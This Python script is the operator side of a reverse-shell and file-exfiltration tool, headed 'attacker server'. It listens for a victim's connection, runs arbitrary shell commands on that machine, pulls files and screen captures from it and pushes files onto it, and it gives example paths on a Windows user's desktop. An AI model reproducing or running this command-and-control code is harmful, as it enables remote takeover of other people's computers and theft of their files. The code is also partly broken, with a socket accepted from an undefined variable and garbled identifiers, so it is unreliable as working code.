# attacker server
#TCP
#Change directory
#TCP bi-directional data transfer

import os
import socket

ip = "0.0.0.0"
port = 8080
chunksize = 1024

def transfer(mySocket, command, operation):
    mySocket.send(command.encode())

    # grab*C:\Users\user\Desktop\file.txt
    if (operation == "grab"):
        grab, path = command.split("*")
        f=open('/root/Desktop/'+path, 'wb')

    if(operation == "screenCap"):
        fileName = "screenCapture.jpg"
        f=open('/root/Desktop/'+fileName, 'wb')

    while True:
        bits = mySocket.recv(chunksize)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4]) # Write those last received bits without the word 'DONE'
            f.close()
            print ('[+] Transfer completed')
            break
        if 'File not found'.encode() in bits:
            f.close()  # not in directions
            print ('[-] Unable to find out the file')
            break
        f.write(bits)

def doSend(mySocket, sourcePath, destinationPath, fileName):
    # For 'send' operation, open the file in the read mode
    # Read the file into packets and send them through mySocket object
    # After finished sending the whole file, send string 'DONE' to indicate the completion
    if os.path.exists(sourcePath + fileName):
        sourceFile = open(sourcePath + fileName, 'rb')
        packet = sourceFile.read(chunksize)
        while len(packet) >0:
            mySocket.send(packet)
            packet = sourceFile.read(chunksize)
        mySocket.send('DONE'.encode())
        print('[+] Transfer Completed')
    else:
        mySocket.send('File not found'.encode())
        print('[-] Unable to find the file')

def connect():
    initSocket = socket.socket()
    initSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    initSocket.bind((ip, port))
    initSocket.listen(1)
    print("=" * 60)
    print("TCP DATA INFILTRATION AND EXFILTRATION")
    print("=" * 60)
    print('[+] Listening for incoming TCP mySocketection on port', port)
    mySocket, clientAddress = mySocket.accept()
    print('[+] We got a mySocketection from', clientAddress)

    while True:
        print("=" * 60)
        command = input("Shell> ")
        if 'terminate' in command:
            mySocket.send('terminate'.encode())
            break

        #command format: grab*<File Path>
        #example: grab*C:\Users\John\Desktop\photo.jpeg
        elif 'grab' in command:
            transfer(mySocket, command, "grab")

        #command format: send*<destination path>*<File Name>
        #example: send*C:\Users\John\Desktop\*photo.jpeg
        #source file in Linux. Example: /root/Desktop
        elif 'send' in command:
            sendCmd, destination, fileName = command.split("*")
            source = input("Source path: ")
            mySocket.send(command.encode())
            doSend(mySocket, source, destination, fileName)
        elif 'screencap' in command:
            transfer(mySocket, command, "screenCap")

        else:
            mySocket.send(command.encode())
            print(mySocket.recv(chunksize).decode())

def main():
    connect()

main()
